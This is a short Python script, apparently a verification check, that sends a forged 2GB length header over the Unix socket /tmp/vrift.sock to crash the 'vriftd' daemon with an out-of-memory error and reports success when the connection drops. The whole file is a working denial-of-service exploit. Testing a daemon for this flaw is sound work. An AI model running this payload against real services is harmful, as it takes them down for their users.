import socket
import struct
import sys
import time

def trigger_oom():
    socket_path = "/tmp/vrift.sock"
    print(f"--- Daemon OOM DoS Verification ---")
    
    try:
        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client.connect(socket_path)
    except FileNotFoundError:
        print(f"[ERROR] Daemon socket not found at {socket_path}")
        sys.exit(1)
    except ConnectionRefusedError:
        print(f"[ERROR] Connection refused. Is the daemon running?")
        sys.exit(1)

    # Malicious length: 2GB (0x7FFFFFFF)
    malicious_len = 0x7FFFFFFF
    print(f"[+] Sending malicious length header: {malicious_len} bytes...")
    
    try:
        # vriftd expects 4-byte little-endian length
        client.send(struct.pack("<I", malicious_len))
        print("[+] Header sent. Monitoring daemon...")
        
        # Give it a moment to try allocation
        time.sleep(1)
        
        # Check if daemon is still alive
        try:
            client.send(b"\x00")
            print("[FAIL] Daemon is still alive! It might have enough memory or ignored the header.")
        except (BrokenPipeError, ConnectionResetError, socket.error):
            print("[SUCCESS] Connection lost. Daemon likely crashed with OOM.")
            
    except Exception as e:
        print(f"[INFO] Socket error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    trigger_oom()
